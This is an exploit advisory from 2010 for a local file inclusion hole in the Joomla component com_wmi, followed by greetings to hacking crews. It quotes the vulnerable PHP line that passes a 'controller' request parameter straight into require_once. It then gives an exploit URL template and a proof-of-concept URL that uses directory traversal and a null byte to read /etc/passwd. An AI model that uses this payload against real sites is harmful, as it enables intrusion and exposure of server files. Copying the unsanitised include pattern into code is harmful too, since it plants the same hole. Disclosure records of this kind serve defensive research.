@@ -1,0 +1,46 @@
+ ================================================================================================
+
+ Title    : Joomla Component wmi (com_wmi) LFI Vulnerability
+ Vendor   : http://www.paysyspro.com/
+ Download : http://www.paysyspro.com/jotloader/files.download/3
+
+ Date     : Sunday, 21 April 2010 - GMT +07:00 Jakarta, Indonesia
+ Author   : wishnusakti + inc0mp13te (HH)
+ Contact  : evileyes60117[at]yahoo.com
+
+ ================================================================================================
+
+ [+] Vulnerable
+
+     ./components/com_wmi/wmi.php
+
+     // Require specific controller if requested
+	if($controller = JRequest::getVar( 'controller' )) {
+    	require_once( JPATH_COMPONENT.DS.'controllers'.DS.$controller.'.php' );
+	}
+
+
+ [+] Exploit
+
+     http://[site]/[path]/index.php?option=com_wmi&controller=[LFI]
+
+ [+] PoC
+
+     http://localhost/index.php?option=com_wmi&controller=../../../../../../../../../etc/passwd%00
+
+ ================================================================================================
+
+Very Special thanks :
+     Penghuni #nob0dy priv8 Server
+     (ander, NoGe, zxvf, kaka11, s4va, meylira, Jack, aJe, Unyil, cheche angela zhang, madonk, & Bot² Scan :D)
+ 
+     en Semua Komunitas Hacking Tanah Air
+     Peace Yo :)
+
+to all my friends : mywisdom, cakill, aurell, hafiz, xco, kiddies, xshadow, gblack, petimati, 
+                    cakill, krembis, biakkobar, hendri_note
+        
+ ================================================================================================
+
+# ./wishnusakti
+
